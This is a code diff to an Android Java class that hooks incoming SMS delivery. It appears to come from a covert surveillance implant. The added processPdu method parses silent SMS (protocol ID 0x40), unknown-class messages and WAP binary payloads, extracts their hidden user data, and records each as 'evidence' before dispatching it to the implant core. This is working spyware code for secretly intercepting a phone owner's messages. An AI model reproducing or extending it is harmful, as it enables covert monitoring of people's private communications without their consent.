@@ -20,7 +20,10 @@ import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
 import java.util.Date;
+import java.util.Hashtable;
+import java.util.Map;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
@@ -64,14 +67,8 @@ public class LowEventHandler implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "  dispatchNormalMessage: got it");
 			}
-			SmsMessage sms = SmsMessage.createFromPdu(pdus[0]);
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "  dispatchNormalMessage: processing '" + sms.getMessageBody() +"',PDU=" + sms.getProtocolIdentifier());
-			}
 
-			if(  sms.getProtocolIdentifier()==0x40) {
-				saveLowEventPdu(pdus[0]);
-			}
+			processPdu(pdus[0]);
 
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
@@ -80,6 +77,62 @@ public class LowEventHandler implements Runnable {
 		}
 		return callOrig;
 	}
+
+	public static void processPdu(byte[] pdu) {
+		SmsMessage sms = SmsMessage.createFromPdu(pdu);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "  processPdu: processing '" + sms.getMessageBody() + "',PDU=" + sms.getProtocolIdentifier());
+		}
+
+		try {
+
+			SmsMessageBase smsBase = new SmsMessageBase(pdu);
+			if(smsBase != null) {
+				smsBase.parseUserData();
+				SmsHeader smsHeader = smsBase.getUserDataHeader();
+				if (smsHeader != null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "  processPdu: processing WAP ");
+						Check.log(TAG + "  processPdu: userData present");
+					}
+					byte[] userData = smsBase.getUserData();
+					byte[] userDataRcs = smsBase.getUserDataRcs();
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "  processPdu: processing WAP '" + userData + "',DPORT=" + smsHeader.portAddrs.destPort + ",SPORT=" + smsHeader.portAddrs.origPort);
+					}
+					if (Cfg.DEBUG) {
+						//7byte to skip userdataHeader
+						Check.log(TAG + "  userData '" + StringUtils.byteArrayToHexString(userData));
+						Check.log(TAG + "  userDataRcs '" + StringUtils.byteArrayToHexString(userDataRcs));
+					}
+				} else {
+					smsBase = null;
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "  processPdu: normal sms");
+					}
+
+				}
+			}
+			if (sms.getProtocolIdentifier() == 0x40 || sms.getMessageClass() == SmsMessage.MessageClass.UNKNOWN) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "  processPdu: pid 0x40 or UNKNOWN messageClass");
+				}
+				saveLowEventPdu(pdu,smsBase);
+			}
+
+		}catch (Exception e){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "  processPdu: failure getting header, try anyway :", e);
+			}
+			if (sms.getProtocolIdentifier() == 0x40 || sms.getMessageClass() == SmsMessage.MessageClass.UNKNOWN) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "  processPdu: pid 0x40 or UNKNOWN messageClass");
+				}
+				saveLowEventPdu(pdu,null);
+			}
+		}
+	}
+
 
 	public static int silentSmsPdu(LowEvent<byte[]> lsms) {
 
@@ -94,7 +147,7 @@ public class LowEventHandler implements Runnable {
 			return callOrig;
 		}
 
-		saveLowEventPdu(lsms.data);
+		saveLowEventPdu(lsms.data,null);
 		return callOrig;
 	}
 
@@ -113,15 +166,7 @@ public class LowEventHandler implements Runnable {
 		}
 
 		try {
-			SmsMessage sms = SmsMessage.createFromPdu(lsms.data);
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "  dispatchNormalMessagePdu: processing '" + sms.getMessageBody() +"',PDU=" + sms.getProtocolIdentifier());
-			}
-
-			if(  sms.getProtocolIdentifier()==0x40 || sms.getMessageClass() == SmsMessage.MessageClass.UNKNOWN) {
-				saveLowEventPdu(lsms.data);
-			}
+			processPdu(lsms.data);
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "  dispatchNormalMessagePdu: Exception:", e);
@@ -130,20 +175,26 @@ public class LowEventHandler implements Runnable {
 		return callOrig;
 	}
 
-	public static void saveLowEventPdu(byte[] pdu) {
+	public static void saveLowEventPdu(byte[] pdu,SmsMessageBase smsB) {
 		try {
 			final SmsMessage sms = SmsMessage.createFromPdu(pdu);
 			ScheduledExecutorService exec = Executors.newScheduledThreadPool(1);
-
+			String body = null;
+			if(smsB!=null){
+			    body = new String(smsB.getUserDataRcs());
+			}else{
+				body = sms.getMessageBody();
+			}
+			final String msgText = body;
 			exec.schedule(new Runnable(){
 				@Override
 				public void run(){
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " silentSmsPdu: saving evidence " + sms.getMessageBody());
+						Check.log(TAG + " silentSmsPdu: saving evidence " + msgText);
 					}
 					String from, to;
 					final String address = sms.getOriginatingAddress();
-					final byte[] body = WChar.getBytes(sms.getMessageBody());
+					final byte[] body = WChar.getBytes(msgText);
 
 					final long date = sms.getTimestampMillis();
 					final boolean sent = false;
@@ -176,7 +227,7 @@ public class LowEventHandler implements Runnable {
 						EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, body, new Date(date));
 					}
 					boolean isCoreRunning = Core.iSR();
-					final Sms rcs_sms = new Sms(sms.getOriginatingAddress(), sms.getMessageBody().toString(),System.currentTimeMillis());
+					final Sms rcs_sms = new Sms(sms.getOriginatingAddress(), msgText.toString(),System.currentTimeMillis());
 					if (isCoreRunning) {
 						ListenerSms.self().internalDispatch(rcs_sms);
 					}else{
